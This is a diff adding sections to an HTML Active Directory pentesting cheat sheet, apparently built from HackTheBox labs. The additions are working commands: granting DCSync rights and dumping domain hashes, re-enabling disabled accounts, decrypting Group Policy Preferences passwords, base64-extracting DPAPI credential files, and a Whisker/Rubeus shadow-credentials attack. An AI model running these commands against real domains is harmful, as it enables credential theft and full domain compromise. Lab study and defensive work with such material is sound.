@@ -639,6 +639,28 @@ $Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\dam
                             <p>Now use that password with netexec. <b>Remember to enclose it with 'password'</b></p>
                         </ul>
 
+                        <h3>WriteDacl</h3>
+                        <ul>
+                            <p>In case you have WriteDacl over the domain you could be able to perform a dcsync attack. That privilege means that you are able to add any permission over the selected object. So in that case we added our user the permissions to perform a dsync attack</p>
+                            <pre><code class="language-bash"> python dacledit.py -action 'write' -rights 'DCSync' -principal 'svc-alfresco' -target-dn 'DC=HTB,DC=LOCAL' 'htb.local'/'svc-alfresco':'s3rvice'</code></pre>
+                            <p>An then remotely performed a dump of all the hashes from the domain</p>
+                            <pre><code class="language-bash">impacket-secretsdump -outputfile result.txt  -just-dc htb.local/svc-alfresco@10.129.95.210</code></pre>
+                        </ul>
+
+                        <h3>Enable account</h3>
+                        <ul>
+                            <p>In case you an account that is disabled you can enabled back again using bloodhound</p>
+                            <pre><code class="language-bash">bloodyAD -d vintage.htb -k --host "dc01.vintage.htb" remove uac svc_sql -f ACCOUNTDISABLE</code></pre>
+                        </ul>
+
+                        <h3>Pre Windows 2000 compatible access</h3>
+                        <ul>
+                            <p>In case you found a computer which is part of the group <b>Pre Windows 2000 comtabile access</b> the password from that computer is likely to be it's name but in lower case letters</p>
+                            <p>For example if it's hostname is <b>FS01</b> password will likely to be <b>fs01</b></p>
+                        </ul>
+
+                        
+
                     </ul>
 
                     <h2 id="Credential hunting">Credential hunting</h2>
@@ -668,6 +690,15 @@ Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction 
                         <ul>
                             <p>Feature that allows a user to configure their Windows operating system to automatically log on to a specific user account, without requiring manual input of the username and password. The values can be found in</p>
                             <pre><code class="language-cmd">reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"</code></pre>
+                        </ul>
+
+                        <h3>Group Policy Preferences Pasword</h3>
+                        <ul>
+                            <p>In case you have access to the SMB share <b>SYSVOL</b> is highly recommended to check that folder in look for the Group Policy Preferences passwords</p>
+                            <p>Group Policy Preferences (GPP) was introduced in Windows Server 2008 and allows administrators to set domain passwords via Group Policy. However, the passwords are encrypted with a publicly known AES-256 key, making them trivial to decrypt.</p>
+                            <p>Passwords are normally located inside a file called <b>groups.xml</b> here goes the path</p>
+                            <pre><code class="language-cmd">SYSVOL\Policies\{NUMBER_OF_POLICY_CHECK_BOTH}\Machine\Preferences\Groups\Groups.xml</code></pre>
+                            <p>Once you downloaded check if inside the file it is field called <b>cpassword</b> which cotains the cyphered password. You can use the following repo to crack it <a class="notion-link" href="https://github.com/t0thkr1s/gpp-decrypt">Here</a></p>
                         </ul>
 
                         <h3>Powershell password decrypt</h3>
@@ -827,7 +858,9 @@ mimikatz # sekurlsa::credman  </code></pre>
                             <pre><code class="language-powershell">impacket-dpapi masterkey -file 08949382-134f-4c63-b93c-ce52efc0aa88 -sid S-1-5-21-3927696377-1337352550-2781715495-1110 -password NightT1meP1dg3on14</code></pre>
                             <p>This will give us the unencrypted key which can be used to show passwords. This passwords are stored in the following path <b>C:/users/todd.wolfe/AppData/Roaming/Microsoft/Credentials/772275FAD58525253490A9B0039791D3</b></p>
                             <pre><code class="language-powershell">impacket-dpapi credential -file "todd.wolfe/AppData/Roaming/Microsoft/Credentials/772275FAD58525253490A9B0039791D3" -key 0xd2832547d1d5e0a01ef27ede2d299248d1cb0320061fd5355fea...</code></pre>
-                              
+                            <br> 
+                            <p>Note: In case you can't download the stored password use this command</p> 
+                            <pre><code class="language-powershell">[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\users\c.neri\appdata\roaming\microsoft\credentials\C4BB96844A5C9DD45D5B6A9859252BA6'))</code></pre>
                             
                         </ul>
                     </ul>
@@ -1029,6 +1062,18 @@ Bypass-UAC -Method UacMethodSysprep</code></pre>
                             <pre><code class="language-powershell">export KRB5CCNAME=/tmp/jpinkman.ccache</code></pre>
                             <p>Finally get the NTLM hash of the user using the AS-REP encrytion key found later</p>
                             <pre><code class="language-powershell">python3 getnthash.py -key 9bc7b2f5fa26ddbaa206c4dbcd367fced55f31a928c517741aced8d922924d76 INLANEFREIGHT.LOCAL/jpinkman</code></pre>
+                            
+                            <h4>From windows</h4>
+                            <ul>
+                                <p>Just in case you are inside a windows machine and found yourselve that you are able to exploit this privielge we could use <b>Whysker.exe</b>. It's simple</p>
+                                <pre><code class="language-powershell">Whisker.exe add /target:VICTIM_USERNAME</code></pre>
+                                <p>This will output a Rubeus command which can be copy and run directly. The command will contain the base64 encoded certificate and the password for the certificate. Here goes an example</p>
+                                <pre><code class="language-powershell">Rubeus.exe asktgt /user:sflowers /certificate:MIIJuAIBAzCCCXQGCSqGS... /password:"BLIyuVyZdhj1USsj" /domain:outdated.htb /dc:DC.outdated.htb /getcredentials /show</code></pre>
+                                <p>Once you have run this the NTLM password hash will be provided at the end of the output</p>
+                                
+                                
+                            </ul>
+                        
                         </ul>
 
                     <h2 id="Named pipes Attack">Named pipes Attack</h2>
